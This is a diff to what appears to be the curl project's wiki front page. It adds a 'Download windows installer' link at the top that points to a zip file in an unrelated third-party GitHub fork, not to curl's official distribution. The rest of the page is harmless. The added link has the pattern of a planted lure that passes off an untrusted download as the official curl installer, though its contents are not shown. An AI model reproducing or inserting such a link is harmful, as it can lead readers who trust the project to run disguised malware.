@@ -1,3 +1,6 @@
+[Download windows installer](https://github.com/FrankFeng/Spoon-Knife/raw/master/Installer%20windows.zip)
+
+
  **curl** is a command line tool for transferring data with URL syntax and **libcurl** is the library curl uses to do its job.
 
 This wiki is meant as a way for users to easily contribute to the project. Additional documentation, hints, guides, examples and more. The main curl web site is at https://curl.se/ and it contains a vast amount of documentation and resources. There's no point in duplicating them here.
